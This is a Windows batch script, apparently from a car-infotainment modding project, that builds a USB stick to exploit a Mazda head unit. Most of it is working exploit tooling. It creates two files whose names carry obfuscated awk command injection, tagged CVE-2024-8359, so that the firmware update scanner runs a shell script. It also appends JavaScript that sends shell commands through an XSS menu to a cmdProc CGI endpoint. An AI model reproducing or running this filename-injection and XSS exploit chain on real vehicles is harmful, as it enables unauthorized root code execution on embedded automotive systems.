@echo off
:: ============================================================================
::  Mazda Tweak Toolkit — prepare USB stick    Windows 10/11
:: ============================================================================
::  Creates a complete installer USB: trigger files, .up injection payloads,
::  tweaks-manager payload (daemon + UI + tweaks), and optional XSS fallback.
::
::  Requires: PowerShell 5+ (bundled with every Win10/11).
::
::  Steps:
::    1. Pick a removable USB drive
::    2. Format as FAT32 with label MZD_TWEAKS (auto if admin, manual otherwise)
::    3. Copy trigger files + tweaks-manager payload + tweaks
::    4. Create .up injection payloads (CVE-2024-8359)
::    5. MD5-verify every critical file on the stick
::
::  Windows hardening:
::   * UTF-8 code page (chcp 65001) with save/restore on exit.
::   * Elevation detection (net session) + auto-format via Format-Volume when
::     admin; otherwise fallback to manual Explorer format.
::   * Removable-drive enumeration via Get-CimInstance Win32_LogicalDisk.
::   * MD5 of every critical file via Get-FileHash.
::   * "!TARGET!" (no trailing backslash) when calling PowerShell — avoids
::     the CRT arg-parser turning `\"` into `"`.
:: ============================================================================
setlocal EnableDelayedExpansion EnableExtensions

:: --- UTF-8 code page (saved + restored on exit) ----------------------------
set "ORIG_CP="
for /f "tokens=2 delims=:" %%p in ('chcp 2^>nul') do set "ORIG_CP=%%p"
if defined ORIG_CP set "ORIG_CP=!ORIG_CP: =!"
chcp 65001 >nul 2>&1

:: --- paths -----------------------------------------------------------------
set "DIR=%~dp0"
set "INSTALLER=%DIR%installer"
set "VERSION=unknown"
if exist "%DIR%VERSION" (
  for /f "usebackq delims=" %%v in ("%DIR%VERSION") do set "VERSION=%%v"
)

:: --- visual markers --------------------------------------------------------
set "M_OK=  * "
set "M_ERR=  x "
set "M_WARN=  ! "
set "M_INFO=  . "

:: --- preflight -------------------------------------------------------------
where powershell >nul 2>&1
if errorlevel 1 (echo. & echo ERROR: powershell.exe not found. & pause & goto :end_err)

:: Detect elevation (used for auto-format).
net session >nul 2>&1
if %errorlevel%==0 (set "IS_ADMIN=1") else (set "IS_ADMIN=0")

:: Check tweaksd binary exists
if not exist "%INSTALLER%\tweaksd" (
  echo %M_ERR%tweaksd binary not found at installer\tweaksd
  echo %M_ERR%build it: make -C tweaksd ^&^& cp tweaksd/tweaksd installer/tweaksd
  goto :end_err
)

echo.
echo ==========================================================
echo  Mazda Tweak Toolkit — Prepare USB               v!VERSION!
echo ==========================================================
echo.

:: --- HUD toolkit XSS files (optional) -------------------------------------
set "HUD_UNLOCK="
if exist "%DIR%..\mazda-hud-toolkit\files\usb_unlock\dev.html" (
  set "HUD_UNLOCK=%DIR%..\mazda-hud-toolkit\files\usb_unlock"
)

:: === Step 1: Detect removable USB drives ===================================
echo %M_INFO%detecting removable USB drives...
echo.

set "PSOUT=%TEMP%\mzd_tweaks_disks.txt"
del /q "%PSOUT%" 2>nul
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue'; $rows = Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=2' | ForEach-Object { $lbl = if ($_.VolumeName) { $_.VolumeName } else { '(no label)' }; '{0}|{1}|{2:N1} GB' -f $_.DeviceID, $lbl, ($_.Size/1GB) }; if (-not $rows) { $rows = Get-Disk | Where-Object { $_.BusType -eq 'USB' } | Get-Partition | Get-Volume | Where-Object { $_.DriveLetter } | ForEach-Object { $lbl = if ($_.FileSystemLabel) { $_.FileSystemLabel } else { '(no label)' }; '{0}:|{1}|{2:N1} GB' -f $_.DriveLetter, $lbl, ($_.Size/1GB) } }; $rows | Out-File -Encoding ASCII '%PSOUT%'" 2>nul

if not exist "%PSOUT%" (
  echo %M_ERR%PowerShell failed to enumerate drives.
  echo       Try: powershell -Command "Get-CimInstance Win32_LogicalDisk"
  goto :end_err
)

set /a N=0
for /f "usebackq tokens=1,2,3 delims=|" %%a in ("%PSOUT%") do (
  set /a N+=1
  set "DRIVE_!N!=%%a"
  set "LABEL_!N!=%%b"
  set "SIZE_!N!=%%c"
  echo   !N!  %%a  ^(%%b, %%c^)
)
del /q "%PSOUT%" 2>nul

if !N!==0 (
  echo %M_ERR%no removable drive found. Plug a USB stick in and try again.
  goto :end_err
)
echo   0  cancel
echo.
set "CH="
set /p "CH=> "
if "!CH!"=="" (echo cancelled & goto :end)
if "!CH!"=="0" (echo cancelled & goto :end)
set "TARGET=!DRIVE_%CH%!"
if "!TARGET!"=="" (echo %M_ERR%invalid choice & goto :end_err)
set "TARGET_BS=!TARGET!\"

echo.
echo %M_WARN%about to WIPE !TARGET!  ^(!LABEL_%CH%!, !SIZE_%CH%!^)
set "OK="
set /p "OK=confirm? [y/N] > "
if /I not "!OK!"=="y" (echo cancelled & goto :end)

:: === Step 2: Format ========================================================
echo.
echo %M_INFO%step 1/5 . formatting !TARGET! as FAT32 with label MZD_TWEAKS
set "FMT_MODE=manual"
if "!IS_ADMIN!"=="1" (
  echo %M_INFO%  admin detected — using PowerShell Format-Volume
  set "FMT_LETTER=!TARGET:~0,1!"
  powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; try { Format-Volume -DriveLetter '!FMT_LETTER!' -FileSystem FAT32 -NewFileSystemLabel 'MZD_TWEAKS' -Confirm:$false -Force | Out-Null; 'OK' } catch { 'FAIL: ' + $_.Exception.Message }" > "%TEMP%\mzd_fmt.txt" 2>&1
  type "%TEMP%\mzd_fmt.txt"
  findstr /B /L "OK" "%TEMP%\mzd_fmt.txt" >nul
  if not errorlevel 1 set "FMT_MODE=done"
  del /q "%TEMP%\mzd_fmt.txt" 2>nul
)
if /I "!FMT_MODE!"=="done" (
  echo %M_OK%  formatted
) else (
  if "!IS_ADMIN!"=="1" echo %M_WARN%  auto-format failed. Falling back to manual format.
  if "!IS_ADMIN!"=="0" echo %M_WARN%  not elevated — cannot auto-format. Please do this now:
  echo %M_INFO%    Explorer — right-click !TARGET! — Format...
  echo %M_INFO%      File system: FAT32   Volume label: MZD_TWEAKS   Quick Format: ON
  echo.
  set "OK="
  set /p "OK=formatted as FAT32 with label MZD_TWEAKS? [y/N] > "
  if /I not "!OK!"=="y" (echo cancelled & goto :end)
)

:: Wait for the drive to be accessible after format
set /a USB_WAIT=0
:usb_wait_mount
if exist "!TARGET_BS!" goto usb_mounted
set /a USB_WAIT+=1
if !USB_WAIT! GEQ 20 (echo %M_ERR%!TARGET! not accessible after 20s & goto :end_err)
timeout /t 1 /nobreak >nul
goto usb_wait_mount
:usb_mounted

:: === Step 3: Copy payload ==================================================
echo %M_INFO%step 2/5 . copying payload

:: XSS/SSH unlock files (optional, from HUD toolkit)
if defined HUD_UNLOCK (
  echo %M_INFO%  copying XSS/SSH unlock files ^(from HUD toolkit^)
  xcopy /E /I /Y "!HUD_UNLOCK!\*" "!TARGET_BS!" >nul 2>nul
  xcopy /Y "!HUD_UNLOCK!\mp3\*.mp3" "!TARGET_BS!" >nul 2>nul
  :: Patch run.js: add Tweaks Manager button to XSS menu.
  :: The JS contains '!' which DelayedExpansion would eat, so we write
  :: it via a subroutine with expansion disabled.
  if exist "!TARGET_BS!js\run.js" (
    call :inject_tm_button "!TARGET_BS!js\run.js"
    echo %M_INFO%    Tweaks Manager button injected into XSS menu ^(run.js^)
  )
  echo %M_OK%  XSS/SSH unlock files copied
) else (
  echo %M_WARN%  HUD toolkit not found — XSS/SSH fallback not included
)

:: USB trigger files
echo %M_INFO%  copying trigger files
set "COPYFAIL=0"
copy /B /Y "%DIR%usb\t"                         "!TARGET_BS!t"                         >nul || set "COPYFAIL=1"
copy /Y    "%DIR%usb\tweaks.sh"                  "!TARGET_BS!tweaks.sh"                 >nul || set "COPYFAIL=1"
copy /Y    "%DIR%usb\jci-autoupdate"             "!TARGET_BS!jci-autoupdate"            >nul || set "COPYFAIL=1"
copy /Y    "%DIR%usb\dataRetrieval_config.txt"   "!TARGET_BS!dataRetrieval_config.txt"  >nul || set "COPYFAIL=1"
if "!COPYFAIL!"=="1" (echo %M_ERR%trigger file copy failed & goto :end_err)
echo %M_OK%  trigger files copied ^(t, tweaks.sh, jci-autoupdate, dataRetrieval_config.txt^)

:: Tweaks Manager payload
echo %M_INFO%  copying tweaks-manager payload
mkdir "!TARGET_BS!tweaks-manager\installer" 2>nul
mkdir "!TARGET_BS!tweaks-manager\lib"       2>nul
mkdir "!TARGET_BS!tweaks-manager\jci-app"   2>nul

set "COPYFAIL=0"
copy /Y    "%DIR%installer\tweaks.sh"       "!TARGET_BS!tweaks-manager\installer\tweaks.sh"    >nul || set "COPYFAIL=1"
copy /B /Y "%DIR%installer\tweaksd"         "!TARGET_BS!tweaks-manager\installer\tweaksd"      >nul || set "COPYFAIL=1"
copy /Y    "%DIR%lib\patch.sh"              "!TARGET_BS!tweaks-manager\lib\patch.sh"           >nul || set "COPYFAIL=1"
copy /Y    "%DIR%jci-app\tweaks-menu.js"    "!TARGET_BS!tweaks-manager\jci-app\tweaks-menu.js" >nul || set "COPYFAIL=1"
copy /Y    "%DIR%VERSION"                   "!TARGET_BS!tweaks-manager\VERSION"                >nul 2>nul
copy /Y    "%DIR%TWEAK_CONTRACT.md"         "!TARGET_BS!tweaks-manager\TWEAK_CONTRACT.md"      >nul 2>nul

if "!COPYFAIL!"=="1" (echo %M_ERR%payload copy failed & goto :end_err)

:: Copy tweaks (each subfolder with all its files)
for /d %%T in ("%DIR%tweaks\*") do (
  set "TNAME=%%~nxT"
  echo %M_INFO%    tweak: !TNAME!
  xcopy /E /I /Y "%%T\*" "!TARGET_BS!tweaks-manager\tweaks\!TNAME!\" >nul
)
echo %M_OK%  tweaks-manager payload copied

:: === Step 4: .up injection payloads (CVE-2024-8359) ========================
echo %M_INFO%step 3/5 . creating .up injection payloads ^(CVE-2024-8359^)

set "UPSCRIPT=%TEMP%\mzd_tweaks_up.ps1"
>  "!UPSCRIPT!" echo $ErrorActionPreference='Stop'
>> "!UPSCRIPT!" echo $d=$args[0]
>> "!UPSCRIPT!" echo $q=[char]39
>> "!UPSCRIPT!" echo $m='$^(' + 'awk -v f=%%c ' + $q + 'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system^(sprintf^(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116^)^)}' + $q + '^).up'
>> "!UPSCRIPT!" echo $t='$^(' + 'awk -v f=%%c ' + $q + 'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system^(sprintf^(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116^)^)}' + $q + '^).up'
>> "!UPSCRIPT!" echo New-Item -ItemType File -Path ^(Join-Path $d $m^) -Force ^| Out-Null
>> "!UPSCRIPT!" echo New-Item -ItemType File -Path ^(Join-Path $d $t^) -Force ^| Out-Null
>> "!UPSCRIPT!" echo ^(Get-ChildItem -LiteralPath $d -Filter '*.up'^).Count

set "UPCOUNT=0"
for /f %%u in ('powershell -NoProfile -ExecutionPolicy Bypass -File "!UPSCRIPT!" "!TARGET!"') do set "UPCOUNT=%%u"
del /q "!UPSCRIPT!" 2>nul

if !UPCOUNT! GEQ 2 (
  echo %M_OK%  !UPCOUNT! .up injection payloads present
) else (
  echo %M_ERR%  expected 2 .up payload files, found !UPCOUNT! — auto-trigger will not work
  goto :end_err
)

:: === Step 5: MD5-verify every critical file =================================
echo %M_INFO%step 4/5 . generating MD5SUM

:: Generate MD5SUM on the stick (PowerShell — matches BusyBox md5sum -c format)
set "MD5SCRIPT=%TEMP%\mzd_tweaks_md5.ps1"
>  "!MD5SCRIPT!" echo $ErrorActionPreference='SilentlyContinue'
>> "!MD5SCRIPT!" echo $d=$args[0]
>> "!MD5SCRIPT!" echo $lines=@^(^)
>> "!MD5SCRIPT!" echo Get-ChildItem -LiteralPath $d -Recurse -File ^| Where-Object {
>> "!MD5SCRIPT!" echo   $_.Extension -ne '.up' -and $_.Name -ne 'MD5SUM' -and $_.Name -notlike '._*' -and $_.Name -ne '.DS_Store'
>> "!MD5SCRIPT!" echo } ^| ForEach-Object {
>> "!MD5SCRIPT!" echo   $rel = $_.FullName.Substring^($d.Length^).TrimStart^('\'^) -replace '\\','/'
>> "!MD5SCRIPT!" echo   $h = ^(Get-FileHash -Algorithm MD5 -LiteralPath $_.FullName^).Hash.ToLower^(^)
>> "!MD5SCRIPT!" echo   $lines += "$h  $rel"
>> "!MD5SCRIPT!" echo }
>> "!MD5SCRIPT!" echo $lines ^| Out-File -Encoding ASCII -FilePath ^(Join-Path $d 'MD5SUM'^)
>> "!MD5SCRIPT!" echo $lines.Count

set "MD5COUNT=0"
for /f %%c in ('powershell -NoProfile -ExecutionPolicy Bypass -File "!MD5SCRIPT!" "!TARGET!"') do set "MD5COUNT=%%c"
del /q "!MD5SCRIPT!" 2>nul
echo %M_OK%  MD5SUM generated ^(!MD5COUNT! files^)

:: === Step 6: Verify critical files ==========================================
echo %M_INFO%step 5/5 . verifying critical files
set /a PROBLEMS=0

:: Check trigger files
for %%f in (t tweaks.sh jci-autoupdate dataRetrieval_config.txt) do (
  if not exist "!TARGET_BS!%%f" (
    echo %M_ERR%  MISSING: %%f
    set /a PROBLEMS+=1
  )
)

:: Check tweaks-manager core files
for %%f in (tweaks-manager\installer\tweaks.sh tweaks-manager\installer\tweaksd tweaks-manager\lib\patch.sh tweaks-manager\jci-app\tweaks-menu.js) do (
  if not exist "!TARGET_BS!%%f" (
    echo %M_ERR%  MISSING: %%f
    set /a PROBLEMS+=1
  )
)

:: Check each tweak has install.sh
for /d %%T in ("%DIR%tweaks\*") do (
  set "TNAME=%%~nxT"
  if not exist "!TARGET_BS!tweaks-manager\tweaks\!TNAME!\install.sh" (
    echo %M_ERR%  MISSING: tweaks\!TNAME!\install.sh
    set /a PROBLEMS+=1
  )
)

:: Check .up payloads
set "UPCHECK=0"
for /f %%u in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "(Get-ChildItem -LiteralPath ''!TARGET!'' -Filter ''*.up'').Count"') do set "UPCHECK=%%u"
if !UPCHECK! GEQ 2 (
  echo %M_OK%  !UPCHECK! .up injection payloads present
) else (
  echo %M_ERR%  expected 2 .up payload files, found !UPCHECK!
  set /a PROBLEMS+=1
)

:: MD5-verify tweaks-manager core against source
set "VSCRIPT=%TEMP%\mzd_tweaks_verify.ps1"
>  "!VSCRIPT!" echo $ErrorActionPreference='SilentlyContinue'
>> "!VSCRIPT!" echo $src=$args[0]; $dst=$args[1]; $bad=0
>> "!VSCRIPT!" echo $files=@('installer\tweaks.sh','installer\tweaksd','lib\patch.sh','jci-app\tweaks-menu.js')
>> "!VSCRIPT!" echo foreach ($f in $files) {
>> "!VSCRIPT!" echo   $sp=Join-Path $src $f; $dp=Join-Path $dst ('tweaks-manager\' + $f)
>> "!VSCRIPT!" echo   if (-not (Test-Path -LiteralPath $dp)) { continue }
>> "!VSCRIPT!" echo   if (-not (Test-Path -LiteralPath $sp)) { continue }
>> "!VSCRIPT!" echo   $sh=(Get-FileHash -Algorithm MD5 -LiteralPath $sp).Hash
>> "!VSCRIPT!" echo   $dh=(Get-FileHash -Algorithm MD5 -LiteralPath $dp).Hash
>> "!VSCRIPT!" echo   if ($sh -ne $dh) { Write-Output ("  CORRUPT: " + $f + " (src=" + $sh.ToLower() + " dst=" + $dh.ToLower() + ")"); $bad++ }
>> "!VSCRIPT!" echo }
>> "!VSCRIPT!" echo exit $bad

powershell -NoProfile -ExecutionPolicy Bypass -File "!VSCRIPT!" "%DIR%" "!TARGET!"
if errorlevel 1 (
  echo %M_ERR%  file corruption detected — re-run prepare-usb.bat
  set /a PROBLEMS+=1
)
del /q "!VSCRIPT!" 2>nul

echo.
if !PROBLEMS!==0 (
  echo %M_OK%all files present and verified
) else (
  echo %M_ERR%!PROBLEMS! problem^(s^) — re-run prepare-usb.bat
  goto :end_err
)

:: Try to eject
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { (New-Object -comObject Shell.Application).Namespace(17).ParseName('!TARGET!').InvokeVerb('Eject') } catch {}" >nul 2>&1

echo.
echo %M_OK%USB ready. In the car:
echo %M_INFO%  1. Insert USB — wait ~30s — Install dialog appears.
echo %M_INFO%     ^(The .up injection triggers via the firmware update scanner.^)
echo %M_INFO%  2. If no dialog: Media — USB — tap any mp3 — XSS menu — SSH.
echo.
pause
goto :end

:: ===========================================================================
:end
if defined ORIG_CP chcp !ORIG_CP! >nul 2>&1
endlocal
exit /b 0

:end_err
echo.
pause
if defined ORIG_CP chcp !ORIG_CP! >nul 2>&1
endlocal
exit /b 1

:: ===========================================================================
:: :inject_tm_button  --  append Tweaks Manager XSS button JS to run.js.
:: Uses DisableDelayedExpansion so JS '!' (negation) is written literally.
:: ===========================================================================
:inject_tm_button
setlocal DisableDelayedExpansion
set "RUNJS=%~1"
>> "%RUNJS%" echo.
>> "%RUNJS%" echo // --- Tweaks Manager XSS button (appended by prepare-usb.bat) ---
>> "%RUNJS%" echo (function(){
>> "%RUNJS%" echo   function injectTM() {
>> "%RUNJS%" echo     var el = document.querySelector('.xss-actions');
>> "%RUNJS%" echo     if (!el) return;
>> "%RUNJS%" echo     if (document.getElementById('xss-tm-btn')) return;
>> "%RUNJS%" echo     var btn = document.createElement('div');
>> "%RUNJS%" echo     btn.id = 'xss-tm-btn';
>> "%RUNJS%" echo     btn.innerHTML = '^<b^>TM^</b^>';
>> "%RUNJS%" echo     btn.className = 'xss-action';
>> "%RUNJS%" echo     btn.style.cssText = 'background:#2196F3;color:#fff';
>> "%RUNJS%" echo     btn.addEventListener('mousedown', function(){
>> "%RUNJS%" echo       var cmd = 'for d in /tmp/mnt/sd?1 /mnt/sd?1;do [ -f $d/tweaks.sh ]^&^&sh $d/tweaks.sh^&break;done';
>> "%RUNJS%" echo       try { var i=new Image(); i.src='/cgi-bin/cmdProc?cmd='+encodeURIComponent(cmd); } catch(e){}
>> "%RUNJS%" echo       try { var f=document.createElement('iframe'); f.style.display='none'; f.src='/cgi-bin/cmdProc?cmd='+encodeURIComponent(cmd); document.body.appendChild(f); } catch(e){}
>> "%RUNJS%" echo     }, false);
>> "%RUNJS%" echo     el.insertBefore(btn, el.firstChild);
>> "%RUNJS%" echo   }
>> "%RUNJS%" echo   if (document.querySelector('.xss-actions')) { injectTM(); }
>> "%RUNJS%" echo   else { setTimeout(injectTM, 1000); }
>> "%RUNJS%" echo })();
endlocal
exit /b 0
